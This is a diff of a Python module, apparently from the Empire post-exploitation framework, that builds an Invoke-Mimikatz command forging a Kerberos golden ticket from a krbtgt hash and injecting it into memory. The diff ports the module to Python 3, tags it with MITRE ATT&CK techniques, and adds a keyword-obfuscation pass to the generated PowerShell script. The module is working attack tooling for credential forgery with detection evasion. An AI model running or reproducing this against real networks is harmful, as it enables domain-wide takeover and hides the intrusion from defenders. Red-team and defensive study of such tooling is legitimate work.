@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -11,6 +17,10 @@ class Module:
 
             'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                             "to generate a golden ticket and inject it into memory."),
+
+            'Software': 'S0002',
+
+            'Techniques': ['T1098', 'T1003', 'T1081', 'T1207', 'T1075', 'T1097', 'T1145', 'T1101', 'T1178'],
 
             'Background' : True,
 
@@ -97,6 +107,16 @@ class Module:
             if option in self.options:
                 self.options[option]['Value'] = value
 
+    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
+    # implemented it in place. Might be worthwhile to just make a database handling file -Hubbl3
+    def get_db_connection(self):
+        """
+        Returns the cursor for SQLlite DB
+        """
+        self.lock.acquire()
+        self.mainMenu.conn.row_factory = None
+        self.lock.release()
+        return self.mainMenu.conn
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
@@ -108,7 +128,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -121,12 +141,12 @@ class Module:
         if credID != "":
             
             if not self.mainMenu.credentials.is_credential_valid(credID):
-                print helpers.color("[!] CredID is invalid!")
+                print(helpers.color("[!] CredID is invalid!"))
                 return ""
 
             (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
             if userName != "krbtgt":
-                print helpers.color("[!] A krbtgt account must be used")
+                print(helpers.color("[!] A krbtgt account must be used"))
                 return ""
 
             if domainName != "":
@@ -138,12 +158,12 @@ class Module:
 
 
         if self.options["krbtgt"]['Value'] == "":
-            print helpers.color("[!] krbtgt hash not specified")
+            print(helpers.color("[!] krbtgt hash not specified"))
 
         # build the golden ticket command        
         scriptEnd = "Invoke-Mimikatz -Command '\"kerberos::golden"
 
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "credid":
                 if values['Value'] and values['Value'] != '':
                     scriptEnd += " /" + str(option) + ":" + str(values['Value']) 
@@ -152,4 +172,6 @@ class Module:
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
